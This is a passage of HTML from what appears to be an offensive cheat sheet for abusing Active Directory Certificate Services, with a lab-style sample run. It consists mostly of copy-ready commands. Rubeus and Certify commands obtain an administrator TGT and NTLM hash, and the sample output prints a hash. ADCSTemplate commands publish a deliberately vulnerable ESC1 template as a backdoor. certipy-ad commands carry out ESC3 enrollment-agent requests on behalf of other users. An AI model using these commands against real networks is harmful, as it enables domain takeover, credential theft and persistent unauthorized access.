</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Certify completed in 00:00:04.3277620
</span></span></span></div></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:<span class="o editable-keyword">&lt;TARGET_USER&gt;</span> /certificate:<span class="o editable-keyword">&lt;BASE64_PFX&gt;</span> /getcredentials /show /nowrap
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">evil-winrm-py PS C:\Users\Ryan.Cooper\Documents&gt; .\rubeus.exe asktgt /user:administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---IAeQBhAG4ALgBDAG8AbwBwAGUAcgAAAAAAAAAAAAAAAAAAAAA= /getcredentials /show /nowrap
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.3 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Got domain: sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: fe80::fd46:191e:1ebb:d867%4:88
</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAg---[SNIP]---hUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  SEQUEL.HTB
</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  administrator (NT_PRINCIPAL)
</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  SEQUEL.HTB
</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  10/29/2025 5:46:06 AM
</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  10/29/2025 3:46:06 PM
</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  11/5/2025 4:46:06 AM
</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable
</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  rc4_hmac
</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  iBzJoaSp3oeH1mytp8l45Q==
</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  F7210CD81F1D64AE8689EBF71822A6D7
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting credentials using U2U
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  CredentialInfo         :
</span></span></span><span class="line"><span class="cl"><span class="go">    Version              : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    EncryptionType       : rc4_hmac
</span></span></span><span class="line"><span class="cl"><span class="go">    CredentialData       :
</span></span></span><span class="line"><span class="cl"><span class="go">      CredentialCount    : 1
</span></span></span><span class="line"><span class="cl"><span class="go">       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
</span></span></span></div></pre></div></div></div>

<p></p>
<h4 id="create-esc1-vulnerable-template">Create ESC1 Vulnerable Template</h4>
<p class="tabs">
<button data-tabset="set7" data-tabcontent="tab1" class="active">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set7"><div class="tabcontent active" data-tabset="set7" data-tabcontent="tab1"><h4 id="1-import-adcstemplate-module">1. Import ADCSTemplate Module</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\ADCSTemplate.psm1
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-create-template-with-mspki-certificate-name-flag-modified">2. Create Template with msPKI-Certificate-Name-Flag Modified</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Export-ADCSTemplate -displayName <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span> &gt; template.json
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">template</span> <span class="o">=</span> cat template.json -raw <span class="p">|</span> ConvertFrom-Json
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>template.<span class="s1">'msPKI-Certificate-Name-Flag'</span> <span class="o">=</span> 0x1
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>template <span class="p">|</span> ConvertTo-Json <span class="p">|</span> Set-Content template_mod.json
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-create-a-new-certificate-template">3. Create a New Certificate Template</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-ADCSTemplate -DisplayName 'VULN_ESC1' -Publish -JSON (cat template_mod.json -raw)
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-allow-target-user-to-enroll-in-the-certificate">4. Allow Target User to Enroll in the Certificate</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-ADCSTemplateACL -DisplayName 'VULN_ESC1' -type allow -identity '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span>' -enroll
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="5-set-subject-alternative-name-san">5. Set Subject Alternative Name (SAN)</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\Certify.exe request --ca <span class="o editable-keyword">&lt;SERVER&gt;</span>\<span class="o editable-keyword">&lt;CA&gt;</span> --template VULN_ESC1 --upn administrator
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="6-get-ntlm-hash">6. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p></div></div><p></p>
<hr>
<h3 id="esc3-enrollment-agent-certificate-template">ESC3: Enrollment Agent Certificate Template</h3>
<p class="tabs">
<button data-tabset="set8" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set8"><div class="tabcontent active" data-tabset="set8" data-tabcontent="tab1"><h4 id="1-obtain-an-enrollment-agent-certificate">1. Obtain an Enrollment Agent Certificate</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-request-a-certificate-on-behalf-of-the-target-user">2. Request a Certificate on behalf of the Target User</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User' -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -on-behalf-of '<span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
